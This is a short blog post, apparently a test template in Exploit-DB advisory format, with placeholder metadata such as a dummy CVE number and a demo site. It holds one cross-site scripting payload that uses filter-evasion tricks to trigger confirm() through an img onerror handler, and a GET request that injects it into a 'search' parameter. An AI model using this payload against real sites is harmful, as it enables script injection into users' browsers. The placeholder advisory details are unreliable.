---
layout:     post
title:      "TEST"
date:       2020-01-18
author:     "Tufan Gungor"
category:   exploit
tags:       [xss, cross site scripting, exploit-db]
---

# Exploit Title: Exploit Title
# Google Dork: intext:"google dork"
# Date: 2020-01-18
# Exploit Author: Tufan Gungor
# Vendor Homepage: tufangungor.github.io
# Software Link: tufangungor.github.io
# Demo Site: tufangungor.demo.io
# Version: 10.0.6
# Tested on: Kali Linux
# CVE: CVE-1111-11111

# Vulnerable Parameter: search

# Payload: <--`<img/src=` onerror=confirm``> --!>

# GET Request: http://localhost/?search=<--`<img/src=` onerror=confirm``> --!>
